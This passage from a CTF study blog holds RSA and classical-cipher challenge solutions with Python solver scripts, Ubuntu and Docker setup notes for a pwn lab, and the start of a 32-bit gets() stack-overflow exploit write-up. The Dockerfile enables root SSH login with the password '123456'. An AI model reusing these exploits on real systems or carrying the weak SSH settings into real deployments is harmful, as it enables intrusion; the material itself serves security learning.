<strong>&#x3D;&#x3D;当e较小时则可直接通过开立方根得到明文&#x3D;&#x3D;</strong><br>c &#x3D; 6021062141588965841587167293</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">n = 0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793</span><br><span class="line">e = 3</span><br><span class="line">c = 6021062141588965841587167293</span><br><span class="line"></span><br><span class="line"># 计算立方根</span><br><span class="line">m = round(c ** (1/3))</span><br><span class="line">if pow(m, 3) == c:</span><br><span class="line">    print(&quot;明文整数:&quot;, m)</span><br><span class="line">    flag = m.to_bytes((m.bit_length() + 7) // 8, byteorder=&#x27;big&#x27;).decode(&#x27;ascii&#x27;)</span><br><span class="line">    print(&quot;Flag:&quot;, flag)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;无法通过低指数攻击破解&quot;)</span><br></pre></td></tr></table></figure><p>明文整数: 1819244357<br>Flag: lowE<br>TZCFlag{lowE}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 非对称加密（Asymmetric Cryptography） </category>
          
          <category> RSA </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>n1,n2,e,c共享素因数</title>
      <link href="/2025/06/6f67f52f7ab4.html"/>
      <url>/2025/06/6f67f52f7ab4.html</url>
      
        <content type="html"><![CDATA[<p>n1&#x3D;9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327<br>n2&#x3D;13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743<br>e &#x3D; 65537<br>c &#x3D; 268065307799668245100155583656026011160002952385077142247208270849202533959057073328593124609246618255434974771312005129546891196910224298782988830299931466177092252318898389606108682805827112298601665236639013976557584096409090034724959181393317682380243407722802135226000120577664046248111234520151522261820924236477640240403636122092626752359753454045971441763375027128396562369686719452592987407716592442173485676980456821015690717339269128488747739318128952772386390939524794974383676486458446499596610588</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from math import gcd </span><br><span class="line">from sympy import mod_inverse </span><br><span class="line">n1 = 9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327 </span><br><span class="line">n2 = 13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743</span><br><span class="line">c = 268065307799668245100155583656026011160002952385077142247208270849202533959057073328593124609246618255434974771312005129546891196910224298782988830299931466177092252318898389606108682805827112298601665236639013976557584096409090034724959181393317682380243407722802135226000120577664046248111234520151522261820924236477640240403636122092626752359753454045971441763375027128396562369686719452592987407716592442173485676980456821015690717339269128488747739318128952772386390939524794974383676486458446499596610588 </span><br><span class="line"></span><br><span class="line">e = 65537 </span><br><span class="line"></span><br><span class="line">p = gcd(n1, n2) # 计算gcd(n1, n2) </span><br><span class="line"></span><br><span class="line">if p &gt; 1: </span><br><span class="line">print(f&quot;发现共享素因数 p = &#123;p&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># 计算另一个素因数 </span><br><span class="line">q1 = n1 // p </span><br><span class="line">q2 = n2 // p </span><br><span class="line"></span><br><span class="line"># 计算φ(n) </span><br><span class="line">phi_n1 = (p - 1) * (q1 - 1) </span><br><span class="line">phi_n2 = (p - 1) * (q2 - 1) </span><br><span class="line"></span><br><span class="line"># 计算私钥d </span><br><span class="line">d1 = mod_inverse(e, phi_n1) </span><br><span class="line">d2 = mod_inverse(e, phi_n2) </span><br><span class="line"></span><br><span class="line"># 解密 </span><br><span class="line">m1 = pow(c, d1, n1) </span><br><span class="line">m2 = pow(c, d2, n2) </span><br><span class="line"></span><br><span class="line"># 转换为ASCII </span><br><span class="line">def num_to_ascii(m):</span><br><span class="line">m_bytes = m.to_bytes((m.bit_length() + 7) // 8, byteorder=&#x27;big&#x27;) </span><br><span class="line">return   m_bytes.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;) </span><br><span class="line">flag1 = num_to_ascii(m1)</span><br><span class="line">flag2 = num_to_ascii(m2) </span><br><span class="line">print(f&quot;flag1 = &#123;flag1&#125;&quot;) </span><br><span class="line">print(f&quot;flag2 = &#123;flag2&#125;&quot;)</span><br><span class="line">else: </span><br><span class="line">print(&quot;未发现共享素因数，需要其他方法分解模数&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现共享素因数 p &#x3D; 1564859779720039565508870182569324208117555667917997801104862601098933699462849007879184203051278194180664616470669559575370868384820368930104560074538872199213236203822337186927275879139590248731148622362880471439310489228147093224418374555428793546002109</p><p>flag1 &#x3D; TZCFlag{I_love_rsa}</p><p>flag2 &#x3D; SN96LdJnS}%?;Z#:n,zzpQ4&#96;9Jv#a?MZ”HZHj</p><p>q审_Pd,&#x3D;R&lt;w^y(iGma,84&gt;uԌUE!t&#x3D;턢u’Q9ݩ}g<br>2.H*~Sm:!eDA</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 非对称加密（Asymmetric Cryptography） </category>
          
          <category> RSA </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>p,q,e</title>
      <link href="/2025/06/ca93d03320bb.html"/>
      <url>/2025/06/ca93d03320bb.html</url>
      
        <content type="html"><![CDATA[<p>在一次RSA密钥对生成中，假设p&#x3D;473398607161，q&#x3D;4511491，e&#x3D;17<br>求解出d作为flga提交</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p=473398607161</span><br><span class="line">q=4511491</span><br><span class="line">e=17</span><br><span class="line">z=(p-1)*(q-1) #欧拉函数</span><br><span class="line">d = pow(e, -1, z) #(e * d) % z == 1 </span><br><span class="line">#m = pow(c, d, n)</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">p = 473398607161 </span><br><span class="line">q = 4511491 </span><br><span class="line">e = 17 </span><br><span class="line">z = (p - 1) * (q - 1) </span><br><span class="line">d = gmpy2.invert(e, z) # e*d mod z = 1</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><p><img src="/images/398FE444-FE62-474E-8333-9D51EDA83FEB.png"><br>右键<br><img src="/images/Pastedimage20250603090548.png"><br>125631357777427553</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 非对称加密（Asymmetric Cryptography） </category>
          
          <category> RSA </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>eg1</title>
      <link href="/2025/06/c6778b7d8e59.html"/>
      <url>/2025/06/c6778b7d8e59.html</url>
      
        <content type="html"><![CDATA[<p>WGRMcdt{Rxqtsdgncdghxqz}<br>a&#x3D;7,b&#x3D;3<br><img src="/images/FE5A1AA8-8C8C-4C9E-9A01-0878584AC108.png"><br>TZCFlag{Congratulations}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 替换加密 </category>
          
          <category> 仿射密码(Affine Cipher) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>p,q,e,c</title>
      <link href="/2025/06/34720d94c3a3.html"/>
      <url>/2025/06/34720d94c3a3.html</url>
      
        <content type="html"><![CDATA[<p>p &#x3D; 3487583947589437589237958723892346254777<br>q &#x3D; 8767867843568934765983476584376578389<br>e &#x3D; 65537<br>cipher &#x3D; 26369494845903294944045520286034018329014599704760363106090278637665342700044</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from sympy import mod_inverse</span><br><span class="line">e = 65537</span><br><span class="line">p = 3487583947589437589237958723892346254777</span><br><span class="line">q = 8767867843568934765983476584376578389</span><br><span class="line">cipher = 26369494845903294944045520286034018329014599704760363106090278637665342700044</span><br><span class="line"></span><br><span class="line">n = p * q #计算模数</span><br><span class="line">phi_n = (p - 1) * (q - 1) #计算欧拉函数</span><br><span class="line"></span><br><span class="line">d = mod_inverse(e, phi_n) #计算私钥d=e^-1 mod ϕ(n)</span><br><span class="line"></span><br><span class="line">m = pow(cipher, d, n) #m=cipher^d mod n使用 pow 函数进行模幂运算，效率更高</span><br><span class="line"></span><br><span class="line">def num_to_ascii(m):</span><br><span class="line">    # 将数字转换为字节流</span><br><span class="line">m_bytes = m.to_bytes((m.bit_length() + 7) // 8, byteorder=&#x27;big&#x27;)</span><br><span class="line">    # 将字节流转换为 ASCII 字符串</span><br><span class="line">    return m_bytes.decode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">flag = num_to_ascii(m)</span><br><span class="line">print(f&quot;flag = &#123;flag&#125;&quot;)</span><br></pre></td></tr></table></figure><p> flag&#x3D;TZCFlag{try_rsa}<br><img src="/images/Pastedimage20250603143947.png">）</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 非对称加密（Asymmetric Cryptography） </category>
          
          <category> RSA </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Url编码</title>
      <link href="/2025/06/fd640f926f7d.html"/>
      <url>/2025/06/fd640f926f7d.html</url>
      
        <content type="html"><![CDATA[<p>%66%6c%61%67%7b%61%6e%64%20%31%3d%31%7d<br>flag{and 1&#x3D;1}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 替换加密 </category>
          
          <category> 凯撒密码(Caesar Cipher) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>变异凯撒</title>
      <link href="/2025/06/ecdefcda6b13.html"/>
      <url>/2025/06/ecdefcda6b13.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250601180351.png"><br><img src="/images/Pastedimage20250601180858.png"><br>ASCII码值<br>f–&gt;102<br>l–&gt;108<br>a–&gt;97<br>g–&gt;103<br><img src="/images/Pastedimage20250601180916.png"><br>每对一位字母进行加密，偏移量依次增加1<br>编写Python代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">txt=&#x27;afZ_r9VYfScOeO_UL^RWUc&#x27;</span><br><span class="line">start=5</span><br><span class="line">for i in txt:</span><br><span class="line">    print(chr(ord(i)+start),end=&#x27;&#x27;)</span><br><span class="line">    start+=1</span><br></pre></td></tr></table></figure><p>flag{Caesar_variation}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 替换加密 </category>
          
          <category> 凯撒密码(Caesar Cipher) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>看我回旋踢</title>
      <link href="/2025/06/03b0b68e120a.html"/>
      <url>/2025/06/03b0b68e120a.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250601021138.png"><br>观察这串密文，我们可以发现开头正好四个字母，并且跟着个括号，这和flag｛｝非常相像，而且题目给我们提示“回旋” 由此我们可以推断出synt是flag经过移位后得到的，这就是凯撒密码。凯撒密码首先选定一个移位数n，比如n&#x3D;3，那么a经过加密后就是d。所以我们在这道题中应该先推测出移位数，s-&gt;f数13次后便得到f，因此移位数就是13，我们可以从网上找到转换器得到结果</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 替换加密 </category>
          
          <category> 凯撒密码(Caesar Cipher) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>apt源</title>
      <link href="/2025/06/361421438fe1.html"/>
      <url>/2025/06/361421438fe1.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Types: deb</span><br><span class="line">URIs: http://mirrors.ustc.edu.cn/ubuntu/</span><br><span class="line">Suites: noble noble-updates noble-security</span><br><span class="line">Components: main restricted universe multiverse</span><br><span class="line">Signed-By: /usr/share/keyrings/ubuntu-archive-keyring.gpg</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 3-分析环境搭建 </category>
          
          <category> Ubuntu </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关闭自动更新</title>
      <link href="/2025/06/2afd25c5206a.html"/>
      <url>/2025/06/2afd25c5206a.html</url>
      
        <content type="html"><![CDATA[<p><code>sudo nano /etc/apt/apt.conf.d/20auto-upgrades</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">APT::Periodic::Update-Package-Lists &quot;0&quot;;</span><br><span class="line">APT::Periodic::Download-Upgradeable-Packages &quot;0&quot;;</span><br><span class="line">APT::Periodic::AutocleanInterval &quot;0&quot;;</span><br><span class="line">APT::Periodic::Unattended-Upgrade &quot;0&quot;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 3-分析环境搭建 </category>
          
          <category> Ubuntu </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>配置静态ip</title>
      <link href="/2025/06/9b9404168e74.html"/>
      <url>/2025/06/9b9404168e74.html</url>
      
        <content type="html"><![CDATA[<p>sudo -i #root用户<br> ls -l &#x2F;etc&#x2F;netplan<br><img src="/images/Pastedimage20250601205045.png"><br>sudo chmod 600 &#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yaml  #修改文件权限<br>sudo nano &#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yaml  #更新配置文件内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: NetworkManager</span><br><span class="line">  ethernets:</span><br><span class="line">    ens33:</span><br><span class="line">      addresses: [192.168.142.132/24]         # 设置静态IP地址和掩码</span><br><span class="line">      routes:</span><br><span class="line">        - to: default</span><br><span class="line">          via: 192.168.142.2</span><br><span class="line">      nameservers:</span><br><span class="line">        addresses: [114.114.114.114,8.8.8.8]  # 设置主、备DNS</span><br><span class="line">      dhcp4: false                            # 禁用dhcp</span><br></pre></td></tr></table></figure><p>sudo netplan apply  #应用更改</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#验证配置</span><br><span class="line">ip a show ens33</span><br><span class="line">ping -c 4 8.8.8.8   </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#确保SSH服务正常运行</span><br><span class="line">sudo apt install openssh-server</span><br><span class="line">sudo systemctl start ssh</span><br><span class="line">sudo systemctl enable ssh</span><br></pre></td></tr></table></figure><p><img src="/images/Pastedimage20250601213334.png"></p><h4 id="使用-SSH-密钥登录（最安全）"><a href="#使用-SSH-密钥登录（最安全）" class="headerlink" title="使用 SSH 密钥登录（最安全）"></a><strong>使用 SSH 密钥登录（最安全）</strong></h4><ol><li>在物理机生成密钥对：<br> ssh-keygen  # 默认保存到 ~&#x2F;.ssh&#x2F;id_rsa&#x3D;&#x3D;(空密码)&#x3D;&#x3D;<br><img src="/images/Pastedimage20250601214315.png">）</li><li>将公钥复制到虚拟机：<br> scp C:\Users\Rhea.ssh\id_rsa.pub <a href="mailto:&#114;&#104;&#101;&#x61;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#x31;&#52;&#50;&#x2e;&#49;&#x33;&#50;">rhea@192.168.142.132</a>:~&#x2F;<br><img src="/images/Pastedimage20250601214846.png">）</li><li>直接免密登录：<br><img src="/images/Pastedimage20250601221831.png">）</li></ol>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 3-分析环境搭建 </category>
          
          <category> Ubuntu </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Dockerfile</title>
      <link href="/2025/06/90e018bb92d9.html"/>
      <url>/2025/06/90e018bb92d9.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM ubuntu:24.04</span><br><span class="line"></span><br><span class="line">ARG DEBIAN_FRONTEND=noninteractive</span><br><span class="line"></span><br><span class="line"><span class="comment">#  32 </span></span><br><span class="line">RUN dpkg --add-architecture i386 &amp;&amp; apt-get -y update</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">RUN apt-get install -y \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    vim \</span><br><span class="line">    nano \</span><br><span class="line">    git \</span><br><span class="line">    curl \</span><br><span class="line">    wget \</span><br><span class="line">    <span class="built_in">sudo</span> \</span><br><span class="line">    netcat-openbsd \</span><br><span class="line">    openssh-server \</span><br><span class="line">    unzip \</span><br><span class="line">    bison \</span><br><span class="line">    flex</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">RUN apt-get install -y \</span><br><span class="line">    python3 \</span><br><span class="line">    python3-pip \</span><br><span class="line">    python3-venv \</span><br><span class="line">    python3-dev \</span><br><span class="line">    python3-setuptools</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">RUN apt-get install -y \</span><br><span class="line">    build-essential \</span><br><span class="line">    libglib2.0-dev \</span><br><span class="line">    libfdt-dev \</span><br><span class="line">    libpixman-1-dev \</span><br><span class="line">    zlib1g-dev \</span><br><span class="line">    gcc-multilib \</span><br><span class="line">    gdb \</span><br><span class="line">    gdb-multiarch \</span><br><span class="line">    clang \</span><br><span class="line">    lldb \</span><br><span class="line">    make \</span><br><span class="line">    cmake</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">RUN apt-get install -y \</span><br><span class="line">    qemu-system-x86 \</span><br><span class="line">    qemu-user \</span><br><span class="line">    qemu-user-binfmt \</span><br><span class="line">    tmux \</span><br><span class="line">    konsole</span><br><span class="line"><span class="comment"># 32</span></span><br><span class="line">RUN apt-get install -y \</span><br><span class="line">    lib32z1 \</span><br><span class="line">    libc6-dbg \</span><br><span class="line">    libc6-dbg:i386 \</span><br><span class="line">    libgcc-s1:i386</span><br><span class="line"><span class="comment"># enable ssh login</span></span><br><span class="line">RUN <span class="built_in">rm</span> -f /etc/service/sshd/down</span><br><span class="line">RUN sed -ri <span class="string">&#x27;s/^#?PermitRootLogin\s+.*/PermitRootLogin yes/&#x27;</span> /etc/ssh/sshd_config &amp;&amp;\</span><br><span class="line">    sed -ri <span class="string">&#x27;s/#UseDNS\ no/UseDNS\ no/g&#x27;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="line">    sed -ri <span class="string">&quot;s/StrictModes yes/StrictModes no/g&quot;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="line">    sed -ri <span class="string">&quot;s/UsePAM yes/UsePAM no/g&quot;</span> /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line"><span class="comment"># enable login with password</span></span><br><span class="line">RUN <span class="built_in">echo</span> <span class="string">&#x27;PasswordAuthentication yes&#x27;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line"><span class="comment"># defaultly we have a user `ubuntu` in the image</span></span><br><span class="line">RUN <span class="built_in">echo</span> <span class="string">&quot;ubuntu:123456&quot;</span> | chpasswd &amp;&amp; \</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;root:123456&quot;</span> | chpasswd</span><br><span class="line"></span><br><span class="line"><span class="comment"># add sudo</span></span><br><span class="line">RUN usermod -aG <span class="built_in">sudo</span> ubuntu</span><br><span class="line"></span><br><span class="line"><span class="comment"># enable ssh key login</span></span><br><span class="line"><span class="comment">#RUN mkdir /home/ubuntu/.ssh &amp;&amp; \</span></span><br><span class="line"><span class="comment">#    echo &quot;Your ssh key&quot; &gt; /home/ubuntu/.ssh/authorized_keys</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># keep container running</span></span><br><span class="line">RUN <span class="built_in">echo</span> <span class="string">&quot;#!/bin/sh\nservice ssh restart\nsleep infinity&quot;</span> &gt; /root/start.sh</span><br><span class="line">RUN <span class="built_in">chmod</span> +x /root/start.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># create venv for pip</span></span><br><span class="line">RUN python3 -m venv /pip_venv &amp;&amp; \</span><br><span class="line">    <span class="built_in">chown</span> -R ubuntu:ubuntu /pip_venv &amp;&amp; \</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;\n\n# pip venv\nsource /pip_venv/bin/activate&quot;</span> &gt;&gt; /home/ubuntu/.bashrc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwn-related tools</span></span><br><span class="line">RUN /pip_venv/bin/pip config <span class="built_in">set</span> global.index-url https://pypi.org/simple &amp;&amp; \</span><br><span class="line">    /pip_venv/bin/pip config <span class="built_in">set</span> global.trusted-host pypi.org &amp;&amp; \</span><br><span class="line">    /pip_venv/bin/pip install --default-timeout=100 --retries=10 -U pip &amp;&amp; \</span><br><span class="line">    /pip_venv/bin/pip install --default-timeout=100 --retries=10 --no-cache-dir \</span><br><span class="line">    pwntools \</span><br><span class="line">    ropgadget \</span><br><span class="line">    z3-solver \</span><br><span class="line">    smmap2 \</span><br><span class="line">    apscheduler \</span><br><span class="line">    ropper \</span><br><span class="line">    unicorn \</span><br><span class="line">    keystone-engine \</span><br><span class="line">    capstone \</span><br><span class="line">    angr \</span><br><span class="line">    pebble \</span><br><span class="line">    r2pipe \</span><br><span class="line">    LibcSearcher \</span><br><span class="line">    poetry</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg</span></span><br><span class="line">RUN git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg &amp;&amp; \</span><br><span class="line">    <span class="built_in">cd</span> pwndbg &amp;&amp; <span class="built_in">chmod</span> +x setup.sh &amp;&amp; ./setup.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CMD [<span class="string">&quot;/root/start.sh&quot;</span>]</span><br><span class="line"></span><br><span class="line">EXPOSE 22</span><br></pre></td></tr></table></figure><p>在一个空白文件夹中创建一个名为 <code>Dockerfile</code> 的文件，并写入上述内容，随后运行如下指令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t pwnenv_ubuntu24 .</span><br><span class="line">docker run -d \ -p 25000:22 \ --name=pwn24 \ --cap-add=SYS_PTRACE \ -v ~/Desktop/CTF:/CTF \ pwnenv_ubuntu24</span><br><span class="line">docker exec -w /CTF -e TERM=xterm-256color -u ubuntu -it pwn24 bash   #进入容器</span><br></pre></td></tr></table></figure><ul><li><code>-d</code>： 使容器在后台运行</li><li><code>-p 25000:22</code>： 容器的 <code>22</code> 端口映射到本地的 <code>25000</code> 端口</li><li><code>--name=pwn24</code>： 容器名为 <code>pwn24</code></li><li><code>--cap-add=SYS_PTRACE</code>：添加 <code>SYS_PTRACE</code> 权限，允许调试和追踪进程</li><li><code>-v ~/Desktop/CTF:/CTF</code> ： 将本地的 <code>~/Desktop/CTF</code> 目录映射到容器中的 <code>/CTF</code> 目录，这样我们便能在容器内访问到本地文件，而无需将文件重复拷贝进容器中</li><li><code>pwnenv_ubuntu24</code>：创建容器所使用的镜像</li></ul><p><strong>启动问题：打开还是gdb 而不是pwngdb</strong><br><img src="/../../../../../images/Pastedimage20250612160927.png"><br><img src="/../../../../../images/Pastedimage20250612161114.png"><br><img src="/../../../../../images/Pastedimage20250612161139.png"><br><img src="/../../../../../images/D339EED4-6AF8-4063-858A-B1FA023C4114.png"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name <span class="string">&quot;pwndbg&quot;</span> 2&gt;/dev/null <span class="comment"># 查找 pwndbg 目录</span></span><br><span class="line"><span class="built_in">cd</span> /pwndbg</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chown</span> -R ubuntu:ubuntu /pwndbg <span class="comment">#赋予目录权限</span></span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p>以后启动：<br><code>sudo docker start pwn24 #启动容器</code>                                                                                                                                                                                            </p><p><code>sudo docker exec -w /CTF -e TERM=xterm-256color -u ubuntu -it pwn24 /bin/bash  #进入容器</code></p><p>退出虚拟环境：deactivate           exit</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 3-分析环境搭建 </category>
          
          <category> Docker搭建 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>gets</title>
      <link href="/2025/06/d20ec042bfa2.html"/>
      <url>/2025/06/d20ec042bfa2.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/4CFEA279-2137-4C60-9C95-DDC38ED31AC11.png"><br>32位仅部分开启RELRO保护<br><img src="/images/F054FEF7-B882-4776-BCDB-686A78907E921.png"><br><img src="/images/5134CF56-EB95-448F-9D0C-96C479650816.png"><br><img src="/images/Pastedimage20250605152104.png"><br>栈布局：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[ s[36] ] [ ebp ] [ 返回地址 ]</span><br></pre></td></tr></table></figure><p>声明了一个长度为 36 字节的字符数组 s，调用 gets 函数，并将 s 数组作为参数传递给它，然后将 gets 函数的返回值作为 ctfshow 函数的返回值。</p><p>这里是 28h，也就是 0x28，对于 32 位程序，我们 payload 还需要加 4 。<br>（根据程序是 32 位还是 64 位，对应加上 4 或 8 个字节的 ebp（栈底））<br><img src="/images/Pastedimage20250605144435.png"><br>漏洞在于 <code>printf(s)</code> 直接使用文件内容作为格式字符串，这会导致：</p><ol><li>如果文件内容包含格式化字符（如 <code>%x</code>, <code>%p</code>, <code>%s</code>），会泄露栈内存</li><li>可能造成内存崩溃（如使用 <code>%n</code> 写入内存）<br>右键Text view<br><img src="/images/Pastedimage20250605150355.png"><br>知道get_flag函数的地址在0x08048586</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn2&#x27;</span>)  <span class="comment">#本地连接</span></span><br><span class="line"><span class="comment">#p=remote(&#x27;10.190.131.17&#x27;,51286) #远程连接</span></span><br><span class="line"></span><br><span 